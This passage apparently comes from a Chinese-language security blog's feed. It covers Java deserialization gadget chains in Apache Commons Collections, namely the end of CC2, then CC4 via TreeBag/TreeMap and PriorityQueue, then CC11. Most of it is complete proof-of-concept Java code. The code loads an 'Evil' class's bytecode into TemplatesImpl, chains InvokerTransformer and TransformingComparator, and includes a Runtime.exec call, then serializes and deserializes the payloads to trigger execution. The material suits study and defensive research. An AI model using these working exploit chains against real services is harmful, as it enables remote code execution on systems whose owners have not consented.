pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> PriorityQueue <span class="title function_">payload1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, transformingComparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(invokerTransformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] objects = (Object[]) field.get(queue);</span><br><span class="line">        objects[<span class="number">0</span>] = getTemplates();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> PriorityQueue <span class="title function_">payload2</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;));</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] objects = (Object[]) field.get(queue);</span><br><span class="line">        objects[<span class="number">0</span>] = getTemplates();</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;comparator&quot;</span>, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/23/CommonsCollections/1709213555846-a807e90a-615d-426a-b46a-bbd214ad32ea.png"></p><h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><h3 id="前置知识-6"><a href="#前置知识-6" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="TreeBag-TreeMap"><a href="#TreeBag-TreeMap" class="headerlink" title="TreeBag &amp; TreeMap"></a><font style="color:rgb(0, 0, 0);">TreeBag &amp; TreeMap</font></h4><p>在CC2链中，使用了优先级队列PriorityQueue反序列化时会调用comparator的compare方法的特性，配合TransformingComparator触发transformer。</p><p>TreeBag是对SortedBag的一个标准实现，TreeBag使用TreeMap来储存数据，并使用指定Comparator来进行排序。TreeBag继承自AbstractMapBag，实现了SortedBag接口。初始化TreeBag时，会创建一个新的TreeMap储存在成员变量map里，而排序使用的Comparator则直接储存在TreeMap中。</p><p><img src="/2023/04/23/CommonsCollections/1709214737708-24fbeba4-8253-4a56-bac7-8f70c751c674.png"></p><p><img src="/2023/04/23/CommonsCollections/1709214778029-a58f905e-cb26-422e-b5bb-a660cf3d17de.png"></p><p>在对TreeBag反序列化时，会将反序列化出来的Comparator对象交给TreeMap实例化，并调用父类的doReadObject方法处理。</p><p><img src="/2023/04/23/CommonsCollections/1709214847689-a4ec7e62-6e6f-4ca4-adec-f87e92962606.png"></p><p>AbstractMapBag#doReadObject方法会向TreeMap中put数据。</p><p><img src="/2023/04/23/CommonsCollections/1709214974426-33b0766c-d495-45f9-8b7a-ca7818898d4a.png">类似优先级队列，对于这种有序的储存数据的集合，反序列化数据时一定会对其进行排序动作，而TreeBag则是依赖了TreeMap在put数据时会调用compare进行排序的特点来实现数据顺序的保存。</p><p><img src="/2023/04/23/CommonsCollections/1709215154328-c2b0899c-38b6-4901-b12f-955d4e6c0900.png"></p><p>compare方法中调用了comparator进行比较，可以使用TransformingComparator触发后续的逻辑。</p><p><img src="/2023/04/23/CommonsCollections/1709215225137-4364d513-f208-4390-8620-d8e980717ac4.png"></p><h3 id="利用构造-6"><a href="#利用构造-6" class="headerlink" title="利用构造"></a>利用构造</h3><p>利用PriorityQueue反序列化时触发的TransformingComparator的compare方法，触发ChainedTransformer的tranform方法链，其中利用InstantiateTransformer实例化TrAXFilter类，调用TemplatesImpl的newTransformer实例化恶意类，执行恶意代码。除此之外，还可以利用TreeBag代替PriorityQueue触发TransformingComparator，后续依旧使用Transformer的调用链。</p><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonscollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">CommonsCollections4</span> <span class="variable">commonsCollections4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections4</span>();</span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> commonsCollections4.payload1();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> commonsCollections4.payload2();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(priorityQueue);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Templates <span class="title function_">getTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TreeBag <span class="title function_">payload1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(transformingComparator);</span><br><span class="line">        treeBag.add(getTemplates());</span><br><span class="line"></span><br><span class="line">        setFieldValue(invokerTransformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> treeBag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> PriorityQueue <span class="title function_">payload2</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, transformingComparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(invokerTransformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] objects = (Object[]) field.get(queue);</span><br><span class="line">        objects[<span class="number">0</span>] = getTemplates();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/23/CommonsCollections/1709216012706-344dbc2c-9390-4b67-9746-8ac7fea66698.png"></p><h2 id="CommonsCollections11"><a href="#CommonsCollections11" class="headerlink" title="CommonsCollections11"></a>CommonsCollections11</h2><p>这里贴一个网上用的比较广的CC11链，其实也就是组合构造，只不过在HashSet构造部分是从底层入手。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonscollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections11</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;h3&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> LazyMap.decorate(map1, invokerTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map2, getTemplates());</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field1;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field1 = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field1 = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> (HashMap) field1.get(hashSet);</span><br><span class="line"></span><br><span class="line">        Field field2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])field2.get(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field field3;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field3 = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field3 = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field3.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field4.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(hashSet);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Templates <span class="title function_">getTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://su18.org/post/ysuserial/">Java 反序列化取经路</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS</title>
      <link href="/2023/04/22/URLDNS/"/>
      <url>/2023/04/22/URLDNS/</url>
      
